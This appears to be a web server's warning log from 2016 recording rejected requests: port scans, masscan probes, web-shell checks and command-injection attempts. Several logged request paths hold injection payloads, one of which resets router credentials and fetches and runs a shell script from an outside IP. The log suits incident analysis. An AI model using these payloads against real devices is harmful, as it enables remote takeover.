+[WARN] [2016-10-11 03:08:06,074] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-11 03:08:06,852] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-10-11 03:08:10,391] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: <soap:Envelope
+[WARN] [2016-10-11 03:08:15,324] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-10-11 03:08:15,534] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-10-11 03:08:18,914] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-10-11 03:08:19,138] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   i  eU??r
+[WARN] [2016-10-11 03:08:19,386] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-10-11 03:08:19,597] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-10-11 03:08:23,090] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: 0?   -c?   $
+[WARN] [2016-10-11 03:08:24,917] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-11 03:08:25,182] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-10-11 03:08:27,069] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-10-11 03:08:27,243] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-10-11 03:08:27,435] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-10-11 03:08:27,626] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-10-11 03:08:27,806] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-10-11 03:08:27,985] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: GIOP  $       
+[WARN] [2016-10-11 03:08:28,163] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  MQTT  be
+[WARN] [2016-10-11 03:08:28,356] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? +<M      
+[WARN] [2016-10-11 11:24:01,568] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-11 22:45:01,559] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-12 17:26:54,328] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-12 19:12:33,375] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-12 22:17:02,104] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-13 07:21:09,503] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-15 18:11:50,139] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-10-15 21:32:11,036] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/login.asp,List(Connection: close),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-17 03:40:23,942] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-17 18:58:21,340] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Request is missing required `Host` header
+[WARN] [2016-10-19 23:44:53,219] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-10-21 00:05:47,334] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Request is missing required `Host` header
+[WARN] [2016-10-21 19:43:07,238] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:14:51,671] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:14:58,372] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:14:59,176] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-23 18:14:59,543] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:15:00,047] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-10-23 18:15:10,271] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-10-23 18:15:10,347] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-10-23 18:15:23,047] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-10-23 18:15:23,135] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-10-23 18:15:23,235] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-10-23 18:15:38,424] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-23 18:15:38,580] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-10-23 18:15:43,755] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-10-23 18:15:43,952] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-10-23 18:15:44,123] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-10-23 18:15:44,200] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-10-23 18:15:44,396] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-10-23 18:17:07,538] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:17:07,538] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (Q??       
+[WARN] [2016-10-23 18:20:32,114] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:20:37,293] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:20:38,049] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-23 18:20:38,461] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 18:20:40,221] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-10-23 18:20:50,665] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-10-23 18:20:50,931] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-10-23 18:21:03,747] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-10-23 18:21:04,025] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-10-23 18:21:04,087] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-10-23 18:21:19,310] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-23 18:21:19,433] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-10-23 18:21:24,567] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-10-23 18:21:24,644] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-10-23 18:21:24,705] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-10-23 18:21:24,789] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-10-23 18:21:24,857] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-10-23 18:22:37,950] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (??C       
+[WARN] [2016-10-23 18:22:37,950] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-23 23:43:18,289] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-24 00:15:58,259] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-10-24 02:49:17,368] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-24 19:18:05,837] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-25 05:23:11,753] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-26 12:44:22,502] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-10-27 15:24:54,904] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-10-28 10:28:04,854] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 00:28:58,884] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 17:37:24,217] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 17:37:55,846] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 17:39:06,104] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 18:00:25,929] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-10-31 19:39:23,878] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/zecmd/zecmd.jsp?comment=id,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-01 15:00:46,466] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-11-01 17:15:38,674] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-01 17:48:05,988] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-01 20:16:04,754] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-01 22:10:44,750] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-01 22:42:51,276] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 01:10:12,834] [rtb-server-akka.actor.default-dispatcher-12] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 06:07:29,322] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 07:14:06,375] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 07:19:51,646] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 07:30:50,714] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: masscan/1.0 (https://github.com/robertdavidgraham/masscan)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 07:40:14,986] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 13:41:39,666] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-11-02 14:21:55,700] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 15:17:34,970] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 16:05:25,966] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 16:05:30,071] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-02 19:19:32,330] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-03 08:30:21,173] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-03 08:52:58,283] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-03 14:13:03,315] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(HEAD,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-03 16:23:39,343] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '\' at position 19: 
+/cgi-bin/;nvram$IFS\set$IFS\http_passwd;nvram$IFS\set$IFS\http_username;nvram$IFS\commit;sleep$IFS\2;cd$IFS\/tmp;wget$IFS\http:\/\/104.130.140.75\/h\/wrt\/ugw.sh;chmod$IFS\777$IFS\/tmp/ugw.sh;/bin/sh$IFS\/tmp/ugw.sh
+                   ^
+
+[WARN] [2016-11-03 23:06:21,402] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-04 10:03:56,104] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-04 15:48:34,705] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? +<M      
